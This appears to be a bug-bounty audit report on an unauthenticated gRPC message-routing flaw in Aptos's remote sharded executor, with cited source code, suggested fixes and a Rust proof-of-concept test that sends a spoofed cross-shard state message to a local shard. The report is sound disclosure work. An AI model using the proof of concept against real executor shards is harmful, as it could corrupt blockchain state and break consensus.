# Audit Report

## Title
Message Type Spoofing Vulnerability in Remote Cross-Shard Communication Enables Arbitrary State Injection

## Summary
The remote executor service's network controller accepts unauthenticated messages from any peer and routes them based solely on a peer-provided `message_type` string without validating that the message payload matches the claimed type. This allows a malicious peer to inject arbitrary cross-shard state values, breaking the deterministic execution invariant and potentially causing consensus divergence across validator shards.

## Finding Description

The vulnerability exists in the remote cross-shard communication system used by the sharded block executor. The attack chain involves multiple components:

**1. No Authentication in Network Layer**

The gRPC network service accepts connections from any peer without authentication. The server is configured with only a timeout, no TLS, and no peer verification: [1](#0-0) 

**2. Message Routing Based on Untrusted Input**

When a `NetworkMessage` arrives via gRPC, the server extracts the `message_type` field directly from the protobuf message (which is controlled by the remote peer) and uses it to route the message to handlers: [2](#0-1) 

The `MessageType` is created directly from the peer-provided string with no validation: [3](#0-2) 

**3. Blind Deserialization of Message Content**

The `RemoteCrossShardClient` receives messages from the network and blindly deserializes the bytes as `CrossShardMsg` without validating that the content matches the expected type: [4](#0-3) 

**4. Direct State Injection**

The deserialized message is processed by `CrossShardCommitReceiver`, which directly calls `set_value()` on the `CrossShardStateView`, injecting the attacker-controlled state: [5](#0-4) 

**5. State Corruption Impact**

The `CrossShardMsg::RemoteTxnWriteMsg` contains a `StateKey` and optional `WriteOp`, which are directly applied to the shared state view: [6](#0-5) 

**Attack Scenario:**

1. Attacker discovers the network addresses of remote executor shards (exposed for inter-shard communication)
2. Attacker connects to a shard's gRPC endpoint (no authentication required)
3. Attacker crafts a malicious `NetworkMessage` with:
   - `message_type`: `"cross_shard_0"` (or any registered round ID)
   - `message`: BCS-serialized `CrossShardMsg::RemoteTxnWriteMsg` containing arbitrary `StateKey` and `WriteOp` values
4. The victim shard accepts the message and routes it based on the attacker-controlled `message_type`
5. The message is deserialized and the attacker's state values are injected into the `CrossShardStateView`
6. Transactions executing on that shard now read poisoned state values
7. Different shards execute transactions with different cross-shard dependencies, producing different outputs
8. This breaks the **Deterministic Execution** invariant: validators no longer produce identical state roots for identical blocks

The vulnerability is deployed in the `ProcessExecutorService`, which is a standalone binary that can be run with remote shard addresses: [7](#0-6) 

## Impact Explanation

**Severity: CRITICAL**

This vulnerability breaks the fundamental **Deterministic Execution** invariant of the Aptos blockchain. According to the Aptos bug bounty criteria, this qualifies as:

1. **Consensus/Safety violations** - Different executor shards can execute the same transactions with different cross-shard state, leading to different transaction outputs and ultimately different state roots. This creates a consensus divergence where validators cannot agree on the canonical blockchain state.

2. **State Consistency violations** - The attacker can inject arbitrary state values that were never produced by legitimate transaction execution, corrupting the integrity of the blockchain state.

3. **Non-recoverable network partition potential** - If different validator nodes execute blocks with poisoned state and produce different state roots, they will diverge permanently and cannot reconcile without manual intervention or a hard fork.

The impact meets **Critical Severity** ($1,000,000 tier) as it enables:
- Consensus safety violations (different nodes commit different states)
- State corruption requiring potentially a hard fork to recover
- Breaking the core deterministic execution guarantee

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to succeed because:

1. **No Authentication Required**: Any network peer can connect to the gRPC endpoints - there are no authentication checks, no TLS, no peer verification.

2. **Network Exposure Required**: The remote executor shards must expose their gRPC ports to each other for legitimate cross-shard communication, making them discoverable on the network.

3. **Simple Exploit**: The attack requires only:
   - Network connectivity to the target shard
   - Ability to craft a protobuf `NetworkMessage` (trivial)
   - Knowledge of BCS serialization format (well-documented)
   - Knowledge of registered message types (can be discovered or guessed, e.g., `"cross_shard_0"`, `"cross_shard_1"`)

4. **No Special Privileges**: The attacker doesn't need:
   - Validator credentials
   - Cryptographic keys
   - Stake in the system
   - Prior authorization

5. **Deployment Reality**: The `ProcessExecutorService` is a real deployable binary with command-line arguments for remote addresses, indicating this is production-ready code.

## Recommendation

Implement multiple layers of defense:

**1. Add Mutual TLS Authentication**

Configure the gRPC server with mutual TLS to authenticate peers:

```rust
// In grpc_network_service/mod.rs
use tonic::transport::{Server, Identity, ServerTlsConfig};

async fn start_async(
    self,
    server_addr: SocketAddr,
    rpc_timeout_ms: u64,
    server_shutdown_rx: oneshot::Receiver<()>,
    tls_config: Option<ServerTlsConfig>,  // Add TLS config parameter
) {
    let mut server_builder = Server::builder()
        .timeout(std::time::Duration::from_millis(rpc_timeout_ms));
    
    // Apply TLS if configured
    if let Some(tls) = tls_config {
        server_builder = server_builder.tls_config(tls).unwrap();
    }
    
    server_builder
        .add_service(NetworkMessageServiceServer::new(self)
            .max_decoding_message_size(MAX_MESSAGE_SIZE))
        .add_service(reflection_service)
        .serve_with_shutdown(server_addr, async {
            server_shutdown_rx.await.ok();
        })
        .await
        .unwrap();
}
```

**2. Validate Message Type Against Content**

Add a validation layer that checks the deserialized message type matches the claimed `message_type`:

```rust
// In remote_cross_shard_client.rs
pub fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
    let rx = self.message_rxs[current_round].lock().unwrap();
    let message = rx.recv().unwrap();
    
    // Deserialize and validate
    let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes())
        .expect("Failed to deserialize CrossShardMsg");
    
    // Additional validation: verify the message is appropriate for this round
    // and hasn't been replayed from a different context
    
    msg
}
```

**3. Cryptographically Sign Messages**

Each shard should sign its outgoing cross-shard messages with its private key, and recipients should verify signatures against a known set of legitimate shard public keys:

```rust
struct SignedCrossShardMsg {
    msg: CrossShardMsg,
    shard_id: ShardId,
    round_id: RoundId,
    signature: Signature,
}
```

**4. Add Message Replay Protection**

Include nonces or timestamps in messages to prevent replay attacks.

**5. Implement Rate Limiting**

Add rate limiting per peer to prevent message flooding attacks.

## Proof of Concept

```rust
// PoC: Malicious client sending spoofed cross-shard message
// File: execution/executor-service/tests/message_spoofing_poc.rs

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use aptos_types::{
    state_store::state_key::StateKey,
    write_set::WriteOp,
};
use aptos_vm::sharded_block_executor::messages::{CrossShardMsg, RemoteTxnWrite};

#[tokio::test]
async fn test_cross_shard_message_spoofing() {
    // Victim shard address (assuming it's running on localhost:8080)
    let victim_addr = "http://127.0.0.1:8080";
    
    // Craft malicious state injection
    let malicious_state_key = StateKey::raw(b"malicious_key");
    let malicious_write_op = WriteOp::Deletion; // Or Creation/Modification
    
    let malicious_msg = CrossShardMsg::RemoteTxnWriteMsg(
        RemoteTxnWrite::new(malicious_state_key, Some(malicious_write_op))
    );
    
    // Serialize using BCS
    let serialized = bcs::to_bytes(&malicious_msg).unwrap();
    
    // Create network message with spoofed type
    let network_msg = NetworkMessage {
        message: serialized,
        message_type: "cross_shard_0".to_string(), // Spoof the message type
    };
    
    // Connect to victim (no authentication required!)
    let mut client = NetworkMessageServiceClient::connect(victim_addr)
        .await
        .unwrap();
    
    // Send malicious message
    let request = tonic::Request::new(network_msg);
    let response = client.simple_msg_exchange(request).await;
    
    assert!(response.is_ok(), "Message was accepted without authentication!");
    
    // At this point, the victim shard has injected our malicious state
    // into its CrossShardStateView, which will be read by executing transactions
    println!("Successfully injected malicious cross-shard state!");
}
```

To run this PoC:
1. Start a remote executor shard using the `executor-service` binary
2. Run the test to demonstrate unauthenticated message injection
3. Observe that the shard accepts and processes the malicious message
4. Verify that subsequent transaction execution reads the poisoned state

## Notes

**Additional Context:**

1. This vulnerability is specific to the **remote execution mode** of the sharded block executor. The local execution mode (using `LocalCrossShardClient`) is not affected as it uses in-memory channels.

2. The vulnerability requires that remote executor shards are deployed and their network addresses are accessible. This may be limited to specific deployment configurations.

3. The issue affects the `secure/net` module which, despite its name, provides NO cryptographic security - it's just a basic TCP/gRPC communication layer.

4. The protobuf message format itself is not the issue - the problem is the complete lack of authentication and the blind trust of peer-provided routing information.

5. This is distinct from the main Aptos validator network, which uses Noise IK protocol for authenticated communication. The `secure/net` module appears to be a separate networking substrate used specifically for remote executor communication.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L75-86)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-116)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L26-45)
```rust
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/messages.rs (L7-18)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum CrossShardMsg {
    RemoteTxnWriteMsg(RemoteTxnWrite),
    StopMsg,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RemoteTxnWrite {
    state_key: StateKey,
    // The write op is None if the transaction is aborted.
    write_op: Option<WriteOp>,
}
```

**File:** execution/executor-service/src/process_executor_service.rs (L11-50)
```rust
/// An implementation of the remote executor service that runs in a standalone process.
pub struct ProcessExecutorService {
    executor_service: ExecutorService,
}

impl ProcessExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let self_address = remote_shard_addresses[shard_id];
        info!(
            "Starting process remote executor service on {}; coordinator address: {}, other shard addresses: {:?}; num threads: {}",
            self_address, coordinator_address, remote_shard_addresses, num_threads
        );
        aptos_node_resource_metrics::register_node_metrics_collector(None);
        let _mp = MetricsPusher::start_for_local_run(
            &("remote-executor-service-".to_owned() + &shard_id.to_string()),
        );

        AptosVM::set_concurrency_level_once(num_threads);
        let mut executor_service = ExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            self_address,
            coordinator_address,
            remote_shard_addresses,
        );
        executor_service.start();
        Self { executor_service }
    }

    pub fn shutdown(&mut self) {
        self.executor_service.shutdown()
    }
}
```
